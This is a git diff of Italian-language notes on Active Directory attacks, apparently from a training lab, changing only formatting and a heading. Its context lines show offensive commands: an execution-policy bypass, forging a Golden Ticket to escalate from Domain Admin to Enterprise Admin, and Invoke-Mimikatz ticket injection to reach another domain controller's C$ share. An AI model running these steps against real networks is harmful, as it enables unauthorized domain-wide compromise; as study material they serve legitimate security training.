@@ -408,6 +408,7 @@ Execute the task
 <img src="Trust_flow_across_forest_1.png" width="400">
 
 ### Da un DC  possiamo forgiare un TGT (Golden Ticket) per un Enterprise Admins. Passiamo da un Domain Admins ad un Enterprise Admins (riconosciuto perchè il suo SID finisce con 519. Possiede l'accesso amministrativo a tutti i domini in una foresta)
+
 ```
 			- powershell -ep bypass
 			- Get-ADTrust -Filter * (verifichiamo la relazione tra padre e figlio che sia bidirezionale)
@@ -437,8 +438,10 @@ Execute the task
 			- Invoke-Mimikatz -Command '"kerberos::ptt [path ticket.kirbi]
 			- ls \\mcorpdc.moneycorp.local\C$
 ```
-## Trust FLow Across Forest
+
+## Trust Flow Across Forest
 ## Across the Forest usando Trust Ticket
+
 ```
 			- powershell -ep bypass
 			- Import-Module Invoke-Mimikatz.ps1
